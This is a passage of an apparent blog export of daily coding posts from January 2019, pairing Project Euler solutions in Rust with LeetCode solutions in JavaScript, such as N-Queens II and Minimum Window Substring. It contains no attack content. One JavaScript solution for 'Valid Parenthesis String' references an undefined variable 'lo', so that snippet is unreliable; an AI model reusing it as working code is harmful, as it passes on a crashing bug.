let dijkstra = (src, dst) =&gt; &#123; let d = new Array(wordList.length).fill(1e10); d[src] = 0; let set = new Set(); for(let i=0; i&lt;wordList.length; ++i)&#123; set.add(i); &#125; while(set.size)&#123; let mx = 1e11; let index; for(const v of set)&#123; if(d[v] &lt; mx)&#123; mx = d[v]; index = v; &#125; &#125; set.delete(index); for(let i=0; i&lt;wordList.length; ++i)&#123; if(G[i][index] + d[index]&lt;d[i])&#123; d[i] = G[i][index] + d[index]; &#125; &#125; &#125; return d[dst]; &#125;; if(!map.has(beginWord)||!map.has(endWord)) return 0; for(let i=0; i&lt;wordList.length; ++i)&#123; for(let j=i+1; j&lt;wordList.length; ++j)&#123; if(OK(wordList[i],wordList[j]))&#123; G[i][j] = G[j][i] = 1; &#125; &#125; &#125; // console.log(G); // console.log(map.get(beginWord),map.get(endWord)); let ans = dijkstra(map.get(beginWord), map.get(endWord)); // console.log(G); return ans &lt; 1e9?ans+1:0;&#125;;// console.log(ladderLength("hit","cog", ["hot","dot","dog","lot","log","cog"]));]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-01-11 Daily Challenge]]></title>
    <url>%2F2019-01-11-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Names scores in Rust and Optimal Division in JavaScript. MathProblem123456789Names scoresProblem 22 Using names.txt (right click and &apos;Save Link/Target As...&apos;), a 46K text file containing over five-thousand first names, begin by sorting it into alphabetical order. Then working out the alphabetical value for each name, multiply this value by its alphabetical position in the list to obtain a name score.For example, when the list is sorted into alphabetical order, COLIN, which is worth 3 + 15 + 12 + 9 + 14 = 53, is the 938th name in the list. So, COLIN would obtain a score of 938 × 53 = 49714.What is the total of all the name scores in the file? SolutionEmmmmm, use .sort so... nothing to say. Implementation1234567891011121314151617181920212223242526fn main() &#123; let mut names = [ String::from("MARY"), String::from("PATRICIA"), String::from("LINDA"), String::from("BARBARA"), /* omit 5K lines */ String::from("HAI"), String::from("ELDEN"), String::from("DORSEY"), String::from("DARELL"), String::from("BRODERICK"), String::from("ALONSO"), ]; names.sort(); let mut ans: i64 = 0; const MINES: i32 = 'A' as i32 - 1; for i in 0..names.len() &#123; let mut score = 0; for letter in names[i].chars() &#123; score += letter as i32 - MINES; &#125; ans += (score * (i as i32 +1)) as i64; &#125; println!("Answer is &#123;&#125;", ans);&#125; AlgorithmProblem123456789101112131415161718192021222324553. Optimal DivisionGiven a list of positive integers, the adjacent integers will perform the float division. For example, [2,3,4] -&gt; 2 / 3 / 4.However, you can add any number of parenthesis at any position to change the priority of operations. You should find out how to add parenthesis to get the maximum result, and return the corresponding expression in string format. Your expression should NOT contain redundant parenthesis.Example:Input: [1000,100,10,2]Output: &quot;1000/(100/10/2)&quot;Explanation:1000/(100/10/2) = 1000/((100/10)/2) = 200However, the bold parenthesis in &quot;1000/((100/10)/2)&quot; are redundant, since they don&apos;t influence the operation priority. So you should return &quot;1000/(100/10/2)&quot;. Other cases:1000/(100/10)/2 = 501000/(100/(10/2)) = 501000/100/10/2 = 0.51000/100/(10/2) = 2Note:The length of the input array is [1, 10].Elements in the given array will be in range [2, 1000].There is only one optimal division for each test case. SolutionI first was derived into a wrong way -- DP. But figured out that mathematical way is the best. Check my code if you don&#39;t get it. Implementation123456789/** * @param &#123;number[]&#125; nums * @return &#123;string&#125; */var optimalDivision = function(nums) &#123; if (nums.length === 1) return `$&#123;nums[0]&#125;`; if (nums.length === 2) return `$&#123;nums[0]&#125;/$&#123;nums[1]&#125;`; return `$&#123;nums[0]&#125;/($&#123;nums.slice(1).join('/')&#125;)`;&#125;;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-01-10 Daily Challenge]]></title>
    <url>%2F2019-01-10-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Amicable number in Rust and Unique Morse Code Words in JavaScript. MathProblem12345678910Amicable numbersProblem 21 Let d(n) be defined as the sum of proper divisors of n (numbers less than n which divide evenly into n).If d(a) = b and d(b) = a, where a ≠ b, then a and b are an amicable pair and each of a and b are called amicable numbers.For example, the proper divisors of 220 are 1, 2, 4, 5, 10, 11, 20, 22, 44, 55 and 110; therefore d(220) = 284. The proper divisors of 284 are 1, 2, 4, 71 and 142; so d(284) = 220.Evaluate the sum of all the amicable numbers under 10000. SolutionOne way to do it is check the divisor in $O(\sqrt n)$ time complexity. One way to do it is get the primal factorial of number, and do it with DFS approach. I came up with this idea and don&#39;t checked its time complexity, nor implemented it. One way to do it is get the prima factorial of number which: $$n=p_1^{a_1}p_2^{a_2}...p_k^{a_k}$$ Then, the sum of divisors(including itself) is $$\prod_{i=1}^{k}(p_i^0+p_i^1+...+p_i^{a_i})$$ ref: https://mathschallenge.net/library/number/sum_of_divisors Implementation12345678910111213141516171819202122232425262728293031323334353637extern crate primal;use std::vec::Vec;use primal::Sieve;fn main() &#123; let sieve = Sieve::new(10000); let mut ans = 0; assert!(sum_of_divisor(284, &amp;sieve) == 220); assert!(sum_of_divisor(220, &amp;sieve) == 284); for num in 2..10000 &#123; let tmp = sum_of_divisor(num, &amp;sieve); if tmp &lt; 10000 &amp;&amp; tmp != num &amp;&amp;sum_of_divisor(tmp, &amp;sieve) == num &#123; ans += tmp + num; &#125; &#125; ans /= 2; println!("Answer is &#123;&#125;", ans);&#125;fn sum_of_divisor(n: i32, sieve: &amp;Sieve) -&gt; i32 &#123; let factors: Vec&lt;(usize, usize)&gt; = match sieve.factor(n as usize) &#123; Ok(v) =&gt; v, Err(_) =&gt; Vec::new(), &#125;; let mut ans = 1; for factor in factors &#123; let mut tmp = 1; let mut sum = 1; for _ in 0..factor.1 &#123; tmp *= factor.0; sum += tmp; &#125; ans *= sum; &#125; ans as i32 - n&#125; AlgorithmProblem123456789101112131415161718192021222324252627804. Unique Morse Code WordsInternational Morse Code defines a standard encoding where each letter is mapped to a series of dots and dashes, as follows: &quot;a&quot; maps to &quot;.-&quot;, &quot;b&quot; maps to &quot;-...&quot;, &quot;c&quot; maps to &quot;-.-.&quot;, and so on.For convenience, the full table for the 26 letters of the English alphabet is given below:[&quot;.-&quot;,&quot;-...&quot;,&quot;-.-.&quot;,&quot;-..&quot;,&quot;.&quot;,&quot;..-.&quot;,&quot;--.&quot;,&quot;....&quot;,&quot;..&quot;,&quot;.---&quot;,&quot;-.-&quot;,&quot;.-..&quot;,&quot;--&quot;,&quot;-.&quot;,&quot;---&quot;,&quot;.--.&quot;,&quot;--.-&quot;,&quot;.-.&quot;,&quot;...&quot;,&quot;-&quot;,&quot;..-&quot;,&quot;...-&quot;,&quot;.--&quot;,&quot;-..-&quot;,&quot;-.--&quot;,&quot;--..&quot;]Now, given a list of words, each word can be written as a concatenation of the Morse code of each letter. For example, &quot;cba&quot; can be written as &quot;-.-..--...&quot;, (which is the concatenation &quot;-.-.&quot; + &quot;-...&quot; + &quot;.-&quot;). We&apos;ll call such a concatenation, the transformation of a word.Return the number of different transformations among all words we have.Example:Input: words = [&quot;gin&quot;, &quot;zen&quot;, &quot;gig&quot;, &quot;msg&quot;]Output: 2Explanation: The transformation of each word is:&quot;gin&quot; -&gt; &quot;--...-.&quot;&quot;zen&quot; -&gt; &quot;--...-.&quot;&quot;gig&quot; -&gt; &quot;--...--.&quot;&quot;msg&quot; -&gt; &quot;--...--.&quot;There are 2 different transformations, &quot;--...-.&quot; and &quot;--...--.&quot;.Note:The length of words will be at most 100.Each words[i] will have length in range [1, 12].words[i] will only consist of lowercase letters. SolutionUse map to encode, set to record. Implementation1234567891011121314151617181920212223/** * @param &#123;string[]&#125; words * @return &#123;number&#125; */var uniqueMorseRepresentations = function(words) &#123; let map = new Map([ ['a','.-'], ['b','-...'], ['c','-.-.'], ['d','-..'], ['e','.'], ['f','..-.'], ['g','--.'], ['h','....'], ['i','..'], ['j','.---'], ['k','-.-'], ['l','.-..'], ['m','--'], ['n','-.'], ['o','---'], ['p','.--.'], ['q','--.-'], ['r','.-.'], ['s','...'], ['t','-'], ['u','..-'], ['v','...-'], ['w','.--'], ['x','-..-'], ['y','-.--'], ['z','--..']]); let set = new Set(); for(const word of words) &#123; let str = ""; for(const c of word) &#123; str += map.get(c); &#125; set.add(str); &#125; return set.size;&#125;;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-01-09 Daily Challenge]]></title>
    <url>%2F2019-01-09-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Factorial digit sum in Rust and Minimum Window Substring in JavaScript. MathProblem12345678910Factorial digit sumProblem 20 n! means n × (n − 1) × ... × 3 × 2 × 1For example, 10! = 10 × 9 × ... × 3 × 2 × 1 = 3628800,and the sum of the digits in the number 10! is 3 + 6 + 2 + 8 + 8 + 0 + 0 = 27.Find the sum of the digits in the number 100! SolutionNothing to say. Implementation123456789101112131415161718extern crate num_bigint;use num_bigint::&#123;BigInt&#125;;fn main() &#123; let mut result: BigInt = BigInt::from(1); for i in 2..101 &#123; let num: BigInt = BigInt::from(i); result = result * &amp;num; &#125; let result = result.to_str_radix(10); let mut ans = 0; const MINES: i32 = 48; for i in result.chars() &#123; ans += (i as i32) - MINES; &#125; println!("Answer is &#123;&#125;",ans);&#125; AlgorithmProblem12345678910111276. Minimum Window SubstringGiven a string S and a string T, find the minimum window in S which will contain all the characters in T in complexity O(n).Example:Input: S = &quot;ADOBECODEBANC&quot;, T = &quot;ABC&quot;Output: &quot;BANC&quot;Note:If there is no such window in S that covers all characters in T, return the empty string &quot;&quot;.If there is such window, you are guaranteed that there will always be only one unique minimum window in S. SolutionJust maintain a sliding window include all needed character. Implementation123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051/** * @param &#123;string&#125; s * @param &#123;string&#125; t * @return &#123;string&#125; */var minWindow = function(s, t) &#123; let t_map = new Map(); let s_map = new Map(); for(const i of t)&#123; if(t_map.has(i)) t_map.set(i, t_map.get(i) + 1); else t_map.set(i, 1); &#125; let lft = 0; let rht = 0; let ans = [-1,-1]; let cnt = 0; let min = 1e10; while (rht &lt; s.length) &#123; let c = s.charAt(rht); if(t_map.has(c))&#123; if(s_map.has(c))&#123; s_map.set(c, s_map.get(c) + 1) &#125;else&#123; s_map.set(c, 1); &#125; if(s_map.get(c) == t_map.get(c))cnt += 1; &#125; if(cnt == t_map.size)&#123; while(lft &lt;= rht &amp;&amp; cnt == t_map.size)&#123; let cc = s.charAt(lft); if(rht - lft + 1 &lt; min)&#123; min = rht - lft + 1; ans[0] = lft; ans[1] = rht; &#125; if(t_map.has(cc)) &#123; s_map.set(cc, s_map.get(cc) - 1); if(s_map.get(cc) &lt; t_map.get(cc))&#123; cnt -= 1; &#125; &#125; ++lft; &#125; &#125; ++rht; &#125; return s.slice(ans[0], ans[1] + 1);&#125;;// console.log(minWindow("ADOBECODEBANC","ABC"));// console.log(minWindow("AA","AA"));]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-01-08 Daily Challenge]]></title>
    <url>%2F2019-01-08-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Counting Sundays in Rust and N-Queens II in JavaScript. MathProblem12345678910111213141516Counting SundaysProblem 19 You are given the following information, but you may prefer to do some research for yourself.- 1 Jan 1900 was a Monday.- Thirty days has September, April, June and November. All the rest have thirty-one, Saving February alone, Which has twenty-eight, rain or shine. And on leap years, twenty-nine.- A leap year occurs on any year evenly divisible by 4, but not on a century unless it is divisible by 400.How many Sundays fell on the first of the month during the twentieth century (1 Jan 1901 to 31 Dec 2000)? SolutionSimple simulation. Implementation123456789101112131415161718192021222324fn main() &#123; assert!(is_leap_year(2016)); assert!(is_leap_year(1997) == false); let days = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]; let mut day = 2; let mut ans = 0; for year in 1901..2001&#123; for month in 0..12 &#123; if day == 0 &#123; ans += 1; &#125; if month == 1 &#123; day = if is_leap_year(year) &#123; (day + 29) % 7 &#125; else &#123; (day + 28) % 7 &#125;; &#125; else &#123; day = (day + days[month]) % 7; &#125; &#125; &#125; println!("Answer is &#123;&#125;", ans);&#125;fn is_leap_year(n: i32) -&gt; bool &#123; n % 400 == 0 || (n % 100 != 0 &amp;&amp; n % 4 == 0)&#125; AlgorithmProblem12345678910111213141516171819202122232452. N-Queens IIThe n-queens puzzle is the problem of placing n queens on an n×n chessboard such that no two queens attack each other.Given an integer n, return the number of distinct solutions to the n-queens puzzle.Example:Input: 4Output: 2Explanation: There are two distinct solutions to the 4-queens puzzle as shown below.[ [&quot;.Q..&quot;, // Solution 1 &quot;...Q&quot;, &quot;Q...&quot;, &quot;..Q.&quot;], [&quot;..Q.&quot;, // Solution 2 &quot;Q...&quot;, &quot;...Q&quot;, &quot;.Q..&quot;]] SolutionSimple DFS. Implementation123456789101112131415161718192021222324252627282930/** * @param &#123;number&#125; n * @return &#123;number&#125; */var totalNQueens = function(n) &#123; let row = new Array(n); let ans = 0; let dfs = (r) =&gt; &#123; if(r == n)&#123; ans++; return; &#125; for(let i = 0 ; i &lt; n; ++ i)&#123; if(check(r, i))&#123; row[r] = i; dfs(r + 1); &#125; &#125; &#125;; let check = (r, col) =&gt; &#123; for(let i = 0; i &lt; r; ++i)&#123; if(row[i] == col || Math.abs(row[i] - col) == Math.abs(r - i))&#123; return false; &#125; &#125; return true; &#125;; dfs(0); return ans;&#125;;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-01-07 Daily Challenge]]></title>
    <url>%2F2019-01-07-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Maximum path sum I in Rust and Valid Parenthesis String in JavaScript. MathProblem1234567891011121314151617181920212223242526272829303132Maximum path sum IProblem 18 By starting at the top of the triangle below and moving to adjacent numbers on the row below, the maximum total from top to bottom is 23.37 42 4 68 5 9 3That is, 3 + 7 + 4 + 9 = 23.Find the maximum total from top to bottom of the triangle below:7595 6417 47 8218 35 87 1020 04 82 47 6519 01 23 75 03 3488 02 77 73 07 63 6799 65 04 28 06 16 70 9241 41 26 56 83 40 80 70 3341 48 72 33 47 32 37 16 94 2953 71 44 65 25 43 91 52 97 51 1470 11 33 28 77 73 17 78 39 68 17 5791 71 52 38 17 14 91 43 58 50 27 29 4863 66 04 68 89 53 67 30 73 16 69 87 40 3104 62 98 27 23 09 70 98 73 93 38 53 60 04 23NOTE: As there are only 16384 routes, it is possible to solve this problem by trying every route. However, Problem 67, is the same challenge with a triangle containing one-hundred rows; it cannot be solved by brute force, and requires a clever method! ;o) SolutionDP or recursive method is capable of doing this. Implementation1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253use std::cmp::max;fn main() &#123; let nums = [[75, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],[95, 64, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],[17, 47, 82, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],[18, 35, 87, 10, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],[20, 4, 82, 47, 65, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],[19, 1, 23, 75, 3, 34, 0, 0, 0, 0, 0, 0, 0, 0, 0],[88, 2, 77, 73, 7, 63, 67, 0, 0, 0, 0, 0, 0, 0, 0],[99, 65, 4, 28, 6, 16, 70, 92, 0, 0, 0, 0, 0, 0, 0],[41, 41, 26, 56, 83, 40, 80, 70, 33, 0, 0, 0, 0, 0, 0],[41, 48, 72, 33, 47, 32, 37, 16, 94, 29, 0, 0, 0, 0, 0],[53, 71, 44, 65, 25, 43, 91, 52, 97, 51, 14, 0, 0, 0, 0],[70, 11, 33, 28, 77, 73, 17, 78, 39, 68, 17, 57, 0, 0, 0],[91, 71, 52, 38, 17, 14, 91, 43, 58, 50, 27, 29, 48, 0, 0],[63, 66, 4, 68, 89, 53, 67, 30, 73, 16, 69, 87, 40, 31, 0],[4, 62, 98, 27, 23, 9, 70, 98, 73, 93, 38, 53, 60, 4, 23]]; let mut mx = [[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, ],[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]]; mx[0][0] = nums[0][0]; for i in 1..15 &#123; for j in 0..i+1 &#123; if j == 0 &#123; mx[i][j] = mx[i-1][j] + nums[i][j]; &#125;else if i == j &#123; mx[i][j] = mx[i-1][j-1] + nums[i][j]; &#125;else&#123; mx[i][j] = max(mx[i-1][j], mx[i-1][j-1]) + nums[i][j]; &#125; // print!("&#123;&#125; ", mx[i][j]); &#125; // println!(""); &#125; let mut ans = 0; for i in 0..15 &#123; ans = max(ans, mx[14][i]); &#125; println!("Answer is &#123;&#125;", ans);&#125; AlgorithmProblem1234567891011121314151617181920678. Valid Parenthesis StringGiven a string containing only three types of characters: &apos;(&apos;, &apos;)&apos; and &apos;*&apos;, write a function to check whether this string is valid. We define the validity of a string by these rules:Any left parenthesis &apos;(&apos; must have a corresponding right parenthesis &apos;)&apos;.Any right parenthesis &apos;)&apos; must have a corresponding left parenthesis &apos;(&apos;.Left parenthesis &apos;(&apos; must go before the corresponding right parenthesis &apos;)&apos;.&apos;*&apos; could be treated as a single right parenthesis &apos;)&apos; or a single left parenthesis &apos;(&apos; or an empty string.An empty string is also valid.Example 1:Input: &quot;()&quot;Output: TrueExample 2:Input: &quot;(*)&quot;Output: TrueExample 3:Input: &quot;(*))&quot;Output: TrueNote:The string size will be in the range [1, 100]. SolutionSimulating a stack is capable for none * parenthesis pairing. Invalid parenthesis is &#39;(&#39; doesn&#39;t have a corresponding &#39;)&#39; or right more &#39;*&#39;, and versa versa. Second way is to maintain the smallest and largest possible number of open left brackets after processing the current character in the string. Solution page also illustrate a DP approach but with $O(N^3)$ time complexity and $O(N^2)$ space complexity, so I don&#39;t want to implement it. Implementation123456789101112131415161718192021222324252627282930313233/** * @param &#123;string&#125; s * @return &#123;boolean&#125; */var checkValidString = function(s) &#123; let stack = []; let star = []; let len = s.length; for(let i = 0; i &lt; len; ++i)&#123; if(s.charAt(i) === "(")&#123; stack.push(i); &#125;else if(s.charAt(i) === ")")&#123; if(stack.length)&#123; stack.pop(); &#125;else if(star.length)&#123; star.pop(); &#125;else&#123; return false; &#125; &#125;else&#123; star.push(i); &#125; &#125; while(stack.length)&#123; if(star.length &amp;&amp; star[star.length-1] &gt; stack[stack.length-1])&#123; stack.pop(); star.pop(); &#125;else&#123; break; &#125; &#125; return stack.length==0;&#125;; 1234567891011121314151617181920212223242526/** * @param &#123;string&#125; s * @return &#123;boolean&#125; */var checkValidString = function(s) &#123; let l = 0; let h = 0; let len = s.length; for(let i = 0; i &lt; len; ++i)&#123; if(s.charAt(i)=="(")&#123; l += 1; h += 1; &#125;else if(s.charAt(i)==")")&#123; l -= 1; h -= 1; &#125;else&#123; l -= 1; h += 1; &#125; if(h &lt; 0)&#123; break; &#125; l = Math.max(lo, 0); &#125; return l == 0;&#125;;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-01-06 Daily Challenge]]></title>
    <url>%2F2019-01-06-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Number letter counts in Rust and Reverse String in JavaScript. MathProblem12345678910Number letter countsProblem 17 If the numbers 1 to 5 are written out in words: one, two, three, four, five, then there are 3 + 3 + 5 + 4 + 4 = 19 letters used in total.If all the numbers from 1 to 1000 (one thousand) inclusive were written out in words, how many letters would be used?NOTE: Do not count spaces or hyphens. For example, 342 (three hundred and forty-two) contains 23 letters and 115 (one hundred and fifteen) contains 20 letters. The use of &quot;and&quot; when writing out numbers is in compliance with British usage. SolutionEmmmm, carefully simulation. Implementation1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556fn main() &#123; assert!(nlc(342) == 23); assert!(nlc(115) == 20); assert!(nlc(1)+nlc(2)+nlc(3)+nlc(4)+nlc(5) == 19); assert!(nlc(900) == 11); let mut ans: i32 = 0; for i in 1..1001 &#123; ans += nlc(i); &#125; println!("Answer is &#123;&#125;", ans);&#125;// nlc means Number Letter Count// only apply to positive number and less than 1e9 + 1fn nlc(n: i32) -&gt; i32 &#123; match n &#123; // one, two, six, ten 1 | 2 | 6 | 10 =&gt; return 3, // zero, four, five, nine 0 | 4 | 5 | 9 =&gt; return 4, // three, seven, eight, forty, fifty, sixty 3 | 7 | 8 | 40 | 50 | 60 =&gt; return 5, // eleven, twelve, twenty, thirty, eighty, ninety 11 | 12 | 20 | 30 | 80 | 90 =&gt; return 6, // fifteen, sixteen, seventy 15 | 16 | 70 =&gt; return 7, // thirteen, fourteen, eighteen, nineteen 13 | 14 | 18 | 19 =&gt; return 8, // seventeen 17 =&gt; return 9, // one million, one billion 1_000_000 | 1_000_000_000 =&gt; return 10, // one thouand 1000 =&gt; return 11, // (\d)0 but not 10 n if n &gt; 20 &amp;&amp; n &lt; 100 =&gt; return nlc(n-n%10) + nlc(n%10), // (\d)00 // &#123;&#125; hundred n if n &gt; 99 &amp;&amp; n &lt; 1000 &amp;&amp; n % 100 == 0 =&gt; return nlc(n/100) + 7, // 101..999 but not 100/200.. // &#123;&#125; hundred and &#123;&#125; n if n &gt; 100 &amp;&amp; n &lt; 1000 =&gt; return nlc(n/100) + 7 + 3 + nlc(n%100), // (\d)000 n if n &gt; 999 &amp;&amp; n &lt; 1000000 &amp;&amp; n % 1000 == 0 =&gt; return nlc(n/1000) + 8, // 1001..999999 // &#123;&#125; thousand &#123;&#125; hundred and &#123;&#125; n if n &gt; 1000 &amp;&amp; n &lt; 1_000_000 =&gt; return nlc(n/1000) + 8 + nlc(n%1000), // (\d)000000 n if n &gt; 999_999 &amp;&amp; n &lt; 1_000_000_000 &amp;&amp; n % 1_000_000 == 0 =&gt; return nlc(n/1_000_000) + 7, // 1000001..999999999 // &#123;&#125; million &#123;&#125; thousand &#123;&#125; hundred and &#123;&#125; n if n &gt; 1_000_000 &amp;&amp; n &lt; 1_000_000_000 =&gt; return nlc(n/1_000_000) + 7 + nlc(n%1_000_000), // -1 for error _ =&gt; return -1, &#125;&#125; AlgorithmProblem123456789101112344. Reverse StringWrite a function that takes a string as input and returns the string reversed.Example 1:Input: &quot;hello&quot;Output: &quot;olleh&quot;Example 2:Input: &quot;A man, a plan, a canal: Panama&quot;Output: &quot;amanaP :lanac a ,nalp a ,nam A&quot; SolutionNothing to say Implementation1234567/** * @param &#123;string&#125; s * @return &#123;string&#125; */var reverseString = function(s) &#123; return s.split("").reverse().join("");&#125;;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-01-05 Daily Challenge]]></title>
    <url>%2F2019-01-05-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Power digit sum in Rust and Swap Adjacent in LR String in JavaScript. MathProblem1234567Power digit sumProblem 16 2^15 = 32768 and the sum of its digits is 3 + 2 + 7 + 6 + 8 = 26.What is the sum of the digits of the number 2^1000? SolutionNothing to say. Implementation12345678910111213141516extern crate num_bigint;use num_bigint::&#123;BigInt&#125;;use std::ops::Shl;fn main() &#123; let mut num: BigInt = BigInt::from(1u32); num = num.shl(1000 as usize); let num = num.to_str_radix(10); let mut ans = 0; const MINES: i32 = 48; for i in num.chars() &#123; ans += (i as i32) - MINES; &#125; println!("Answer is &#123;&#125;", ans);&#125; AlgorithmProblem12345678910111213141516171819777. Swap Adjacent in LR StringIn a string composed of &apos;L&apos;, &apos;R&apos;, and &apos;X&apos; characters, like &quot;RXXLRXRXL&quot;, a move consists of either replacing one occurrence of &quot;XL&quot; with &quot;LX&quot;, or replacing one occurrence of &quot;RX&quot; with &quot;XR&quot;. Given the starting string start and the ending string end, return True if and only if there exists a sequence of moves to transform one string to the other.Example:Input: start = &quot;RXXLRXRXL&quot;, end = &quot;XRLXXRRLX&quot;Output: TrueExplanation:We can transform start to end following these steps:RXXLRXRXL -&gt;XRXLRXRXL -&gt;XRLXRXRXL -&gt;XRLXXRRXL -&gt;XRLXXRRLXNote:1 &lt;= len(start) = len(end) &lt;= 10000.Both start and end will only consist of characters in &#123;&apos;L&apos;, &apos;R&apos;, &apos;X&apos;&#125;. SolutionWe could observe these pattern: Any one &quot;L&quot; and another &quot;R&quot; won&#39;t change their relative position. Position of &quot;L&quot;s only can be more left, &quot;R&quot; only can be more right. Implementation1234567891011121314151617181920212223242526272829303132/** * @param &#123;string&#125; start * @param &#123;string&#125; end * @return &#123;boolean&#125; */var canTransform = function(start, end) &#123; let fset = []; let fpos = []; let sset = []; let spos = []; for(let i = 0, l = start.length; i &lt; l; ++i)&#123; if(start[i] != "X")&#123; fset.push(start[i]); fpos.push(i); &#125; &#125; for(let i = 0, l = start.length; i &lt; l; ++i)&#123; if(end[i] != "X")&#123; sset.push(end[i]); spos.push(i); &#125; &#125; if(fset.length != sset.length) return false; for(let i = 0, l = fset.length; i &lt; l; ++i)&#123; if(fset[i] != sset[i]|| (fset[i] == "L" &amp;&amp; fpos[i] &lt; spos[i])|| (fset[i] == "R" &amp;&amp; fpos[i] &gt; spos[i]))&#123; return false; &#125; &#125; return true;&#125;;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-01-04 Daily Challenge]]></title>
    <url>%2F2019-01-04-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Lattice paths in Rust and Robot Return to Origin in JavaScript. MathProblem12345678Lattice pathsProblem 15 Starting in the top left corner of a 2×2 grid, and only being able to move to the right and down, there are exactly 6 routes to the bottom right corner.How many such routes are there through a 20×20 grid? SolutionTo a $n*n$ grid, the answer is $C_{2n}^{n}$. Implementation123456789101112131415161718extern crate num_bigint;extern crate num_traits;use num_bigint::&#123;BigUint&#125;;use num_traits::&#123;One&#125;;fn main() &#123; let mut f1: BigUint = One::one(); for i in 21u32..41u32 &#123; let f2 = BigUint::from(i); f1 = f1 * &amp;f2; &#125; for i in 1u32..21u32 &#123; let f2 = BigUint::from(i); f1 = f1 / &amp;f2; &#125; println!("Answer is &#123;&#125;", f1.to_str_radix(10));&#125; AlgorithmProblem1234567891011121314151617181920657. Robot Return to OriginThere is a robot starting at position (0, 0), the origin, on a 2D plane. Given a sequence of its moves, judge if this robot ends up at (0, 0) after it completes its moves.The move sequence is represented by a string, and the character moves[i] represents its ith move. Valid moves are R (right), L (left), U (up), and D (down). If the robot returns to the origin after it finishes all of its moves, return true. Otherwise, return false.Note: The way that the robot is &quot;facing&quot; is irrelevant. &quot;R&quot; will always make the robot move to the right once, &quot;L&quot; will always make it move left, etc. Also, assume that the magnitude of the robot&apos;s movement is the same for each move.Example 1:Input: &quot;UD&quot;Output: true Explanation: The robot moves up once, and then down once. All moves have the same magnitude, so it ended up at the origin where it started. Therefore, we return true. Example 2:Input: &quot;LL&quot;Output: falseExplanation: The robot moves left twice. It ends up two &quot;moves&quot; to the left of the origin. We return false because it is not at the origin at the end of its moves. SolutionNothing to say. Implemtation123456789101112131415/** * @param &#123;string&#125; moves * @return &#123;boolean&#125; */var judgeCircle = function(moves) &#123; let up = 0; let left = 0; for(const i of moves)&#123; if(i === "L") left++; else if(i === "R") left--; else if(i === "U") 